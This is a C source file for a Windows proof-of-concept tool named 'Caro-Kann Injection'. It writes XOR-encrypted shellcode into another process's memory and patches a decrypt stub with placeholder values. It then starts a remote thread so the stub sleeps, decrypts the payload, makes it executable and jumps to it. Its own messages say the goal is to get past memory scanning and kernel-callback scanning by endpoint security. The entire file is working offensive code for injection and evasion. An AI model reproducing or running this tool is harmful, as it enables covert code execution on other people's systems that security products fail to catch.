#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// XOR key for encryption/decryption (must match xor_encrypt.c)
#define XOR_KEY 0x04030201

// Eggs (placeholders) in decrypt_stub
#define EGG_PAYLOAD_ADDR   0x8888888888888888  // Will be replaced with encrypted payload address
#define EGG_PAYLOAD_SIZE   0xDEAD10AF           // Will be replaced with payload size
#define EGG_JUMP_ADDR      0x0000000000000000  // Will be replaced with decrypted payload address (for jump)

unsigned char* ReadFileToBuffer(const char* filename, SIZE_T* size) {
    FILE* file = fopen(filename, "rb");
    if (file == NULL) {
        printf("[-] Failed to open file: %s\n", filename);
        return NULL;
    }

    fseek(file, 0, SEEK_END);
    *size = ftell(file);
    fseek(file, 0, SEEK_SET);

    unsigned char* buffer = (unsigned char*)malloc(*size);
    if (buffer == NULL) {
        printf("[-] Failed to allocate memory\n");
        fclose(file);
        return NULL;
    }

    size_t bytesRead = fread(buffer, 1, *size, file);
    if (bytesRead != *size) {
        printf("[-] Failed to read file\n");
        free(buffer);
        fclose(file);
        return NULL;
    }

    fclose(file);
    return buffer;
}

BOOL PatchEgg(unsigned char* buffer, SIZE_T bufferSize, const unsigned char* eggPattern,
              SIZE_T eggSize, const void* replacement, SIZE_T replacementSize, const char* eggName) {
    for (SIZE_T i = 0; i <= bufferSize - eggSize; i++) {
        if (memcmp(&buffer[i], eggPattern, eggSize) == 0) {
            printf("[+] Found %s at offset: 0x%zx\n", eggName, i);
            memcpy(&buffer[i], replacement, replacementSize);
            printf("[+] Patched %s with value: %p\n", eggName, *(void**)replacement);
            return TRUE;
        }
    }
    printf("[-] Could not find %s\n", eggName);
    return FALSE;
}

BOOL CaroKannInjection(DWORD pid, const char* encryptedPayloadFile, const char* decryptStubFile) {
    printf("\n[+] Caro-Kann Injection\n");
    printf("[+] Encrypted Shellcode Memory Scan Evasion\n");
    printf("[+] Original Research: S3cur3Th1sSh1t\n\n");

    printf("[+] Target PID: %lu\n", pid);
    printf("[+] Encrypted payload: %s\n", encryptedPayloadFile);
    printf("[+] Decrypt stub: %s\n", decryptStubFile);

    // Open target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        printf("[-] Failed to open process: %lu\n", GetLastError());
        return FALSE;
    }
    printf("[+] Opened target process\n");

    // Read encrypted payload
    SIZE_T encryptedPayloadSize;
    unsigned char* encryptedPayload = ReadFileToBuffer(encryptedPayloadFile, &encryptedPayloadSize);
    if (encryptedPayload == NULL) {
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] Loaded encrypted payload: %zu bytes\n", encryptedPayloadSize);

    // Read decrypt stub
    SIZE_T decryptStubSize;
    unsigned char* decryptStub = ReadFileToBuffer(decryptStubFile, &decryptStubSize);
    if (decryptStub == NULL) {
        free(encryptedPayload);
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] Loaded decrypt stub: %zu bytes\n", decryptStubSize);

    // Step 1: Allocate RW memory for encrypted payload
    LPVOID payloadAddr = VirtualAllocEx(hProcess, NULL, encryptedPayloadSize,
                                         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (payloadAddr == NULL) {
        printf("[-] Failed to allocate RW memory for payload: %lu\n", GetLastError());
        free(encryptedPayload);
        free(decryptStub);
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] Allocated RW memory for encrypted payload at: %p\n", payloadAddr);

    // Write encrypted payload
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, payloadAddr, encryptedPayload, encryptedPayloadSize, &bytesWritten)) {
        printf("[-] Failed to write encrypted payload: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, payloadAddr, 0, MEM_RELEASE);
        free(encryptedPayload);
        free(decryptStub);
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] Wrote encrypted payload (%zu bytes) to RW memory\n", bytesWritten);
    printf("[!] Memory scan will only see encrypted payload in RW section\n\n");

    // Step 2: Patch decrypt stub with eggs
    printf("[*] Patching decrypt stub eggs...\n");

    // Egg 1: Payload address (0x88 * 8)
    unsigned char egg1Pattern[8] = {0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88};
    if (!PatchEgg(decryptStub, decryptStubSize, egg1Pattern, 8, &payloadAddr, 8, "Payload Address Egg")) {
        VirtualFreeEx(hProcess, payloadAddr, 0, MEM_RELEASE);
        free(encryptedPayload);
        free(decryptStub);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Egg 2: Payload size (0xDEAD10AF)
    unsigned char egg2Pattern[4] = {0xAF, 0x10, 0xAD, 0xDE};
    DWORD payloadSize = (DWORD)encryptedPayloadSize;
    if (!PatchEgg(decryptStub, decryptStubSize, egg2Pattern, 4, &payloadSize, 4, "Payload Size Egg")) {
        VirtualFreeEx(hProcess, payloadAddr, 0, MEM_RELEASE);
        free(encryptedPayload);
        free(decryptStub);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Egg 3: Jump address (in trampoline: mov r10, 0x0000000000000000; jmp r10)
    // Pattern: 49 BA 00 00 00 00 00 00 00 00 41 FF E2
    unsigned char egg3Pattern[13] = {0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0xFF, 0xE2};
    // We patch the 8 bytes after "49 BA" (offset +2)
    for (SIZE_T i = 0; i <= decryptStubSize - 13; i++) {
        if (memcmp(&decryptStub[i], egg3Pattern, 13) == 0) {
            printf("[+] Found Jump Address Egg at offset: 0x%zx\n", i);
            memcpy(&decryptStub[i + 2], &payloadAddr, 8);
            printf("[+] Patched Jump Address with: %p\n", payloadAddr);
            break;
        }
    }

    printf("\n");

    // Step 3: Allocate RX memory for decrypt stub
    LPVOID stubAddr = VirtualAllocEx(hProcess, NULL, decryptStubSize,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (stubAddr == NULL) {
        printf("[-] Failed to allocate RX memory for decrypt stub: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, payloadAddr, 0, MEM_RELEASE);
        free(encryptedPayload);
        free(decryptStub);
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] Allocated RX memory for decrypt stub at: %p\n", stubAddr);

    // Write decrypt stub
    if (!WriteProcessMemory(hProcess, stubAddr, decryptStub, decryptStubSize, &bytesWritten)) {
        printf("[-] Failed to write decrypt stub: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, payloadAddr, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, stubAddr, 0, MEM_RELEASE);
        free(encryptedPayload);
        free(decryptStub);
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] Wrote decrypt stub (%zu bytes) to RX memory\n", bytesWritten);

    // Step 4: Create remote thread to execute decrypt stub
    printf("\n[*] Creating remote thread on decrypt stub...\n");
    printf("[!] Kernel callbacks may trigger memory scan now\n");
    printf("[!] But they will only find:\n");
    printf("[!]   - RW memory: Encrypted payload (no executable signature)\n");
    printf("[!]   - RX memory: Decrypt stub (custom, non-malicious)\n\n");

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                         (LPTHREAD_START_ROUTINE)stubAddr, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("[-] Failed to create remote thread: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, payloadAddr, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, stubAddr, 0, MEM_RELEASE);
        free(encryptedPayload);
        free(decryptStub);
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] Remote thread created successfully!\n");
    printf("[+] Thread will execute decrypt stub, which will:\n");
    printf("[+]   1. Sleep (avoid immediate memory scan)\n");
    printf("[+]   2. Decrypt encrypted payload (XOR)\n");
    printf("[+]   3. Change memory protection (RW -> RX)\n");
    printf("[+]   4. Jump to decrypted payload\n");

    CloseHandle(hThread);
    free(encryptedPayload);
    free(decryptStub);
    CloseHandle(hProcess);

    printf("\n[+] Caro-Kann injection successful!\n");
    return TRUE;
}

int main(int argc, char* argv[]) {
    printf("[+] Caro-Kann Injection POC\n");
    printf("[+] Encrypted Shellcode Memory Scan Evasion\n");
    printf("[+] Original Research: S3cur3Th1sSh1t\n\n");

    if (argc != 4) {
        printf("Usage: %s <pid> <encrypted_payload.bin> <decrypt_stub.bin>\n", argv[0]);
        printf("\n");
        printf("Example:\n");
        printf("  %s 1234 calc_encrypted.bin decrypt_stub.bin\n", argv[0]);
        printf("\n");
        printf("Notes:\n");
        printf("  - encrypted_payload.bin: XOR-encrypted shellcode\n");
        printf("  - decrypt_stub.bin: Compiled decrypt stub with eggs\n");
        printf("  - Use xor_encrypt.exe to encrypt payload\n");
        printf("  - Compile decrypt_stub.c to generate decrypt_stub.bin\n");
        return 1;
    }

    DWORD pid = atoi(argv[1]);
    if (pid == 0) {
        printf("[-] Invalid PID: %s\n", argv[1]);
        return 1;
    }

    if (CaroKannInjection(pid, argv[2], argv[3])) {
        return 0;
    }
    else {
        return 1;
    }
}
